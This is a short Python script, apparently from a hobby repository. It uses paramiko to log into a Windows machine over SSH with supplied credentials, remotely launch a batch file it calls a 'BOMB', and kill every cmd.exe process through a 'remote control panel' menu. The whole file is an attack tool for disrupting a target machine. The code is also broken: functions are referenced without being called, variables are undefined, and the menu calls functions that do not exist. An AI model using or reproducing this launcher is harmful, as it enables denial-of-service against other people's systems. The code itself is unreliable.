#Info in Git Repo

import paramiko
import sys

Target_IP="Insert Target Ip Here"
Username="Insert Target Username Here"
Password="Target Password Here"


def get_ssh_client():
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(Target_IP,port=22,username=Username,password=Password)
    return ssh


def save_bomb1():
    ssh=get_ssh_client
    try:
        Save_Bomb = 'cmd.exe /c start "" "FILE PATH OF .Bat BOMB"'
        _, _, stderr = ssh.exec_command(Save_Bomb)[2]

        errors = stderr.read().decode()
        if errors:
            print(f"Error Opening file: {errors}")
        else:
            print("Success")
    finally:
        ssh.close()



def kill_bomb1():
    get_ssh_client
    try: 
        Kill_Bomb = "taskkill /IM cmd.exe /F"
        stderr = ssh.exec_command(command)[2]

        errors = stderr.read().decode()
        if errors:
            print(f"Error Opening file: {errors}")
        else:
            print("Success")
    finally:
        ssh.close()        


####################### GUI DEVELOPMENT #######################

def interactive_menu():
    """Main terminal loop."""
    while True:
        print("\n==============================")
        print("    REMOTE CONTROL PANEL      ")
        print("==============================")
        print("1. Open the .bat file")
        print("2. Kill all running .bat files")
        print("3. Exit Program")
        print("==============================")
        
        choice = input("Enter your choice (1-3): ").strip()
        
        if choice == "1":
            open_remote_file()
        elif choice == "2":
            close_all_bat_files()
        elif choice == "3":
            print("\nExiting program. Goodbye!")
            sys.exit()
        else:
            print("\n[!] Invalid selection. Please enter 1, 2, or 3.")

if __name__ == "__main__":
    interactive_menu()